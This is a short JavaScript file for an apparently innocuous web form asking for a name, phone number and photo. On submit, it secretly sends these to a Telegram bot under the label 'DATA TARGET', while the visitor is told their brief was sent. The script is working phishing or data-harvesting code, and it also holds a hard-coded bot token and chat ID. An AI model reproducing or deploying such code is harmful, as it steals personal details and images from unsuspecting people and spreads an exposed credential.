const BOT_TOKEN = "7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw";
const CHAT_ID = "6466187930";

document.getElementById("tanggal").value = new Date().toLocaleDateString("id-ID");

const form = document.getElementById("glofyForm");
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const nama = form.nama.value;
  const hp = form.hp.value;
  const fileInput = document.getElementById("upload");
  const file = fileInput.files[0];

  if (!file) {
    alert("Gambar harus diunggah.");
    return;
  }

  // Kirim data teks
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: `DATA TARGET:\nNama: ${nama}\nNo. HP: ${hp}\nTanggal: ${new Date().toLocaleDateString("id-ID")}`
    })
  });

  // Kirim foto
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", file);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  });

  alert("Brief berhasil dikirim! Terima kasih.");
});
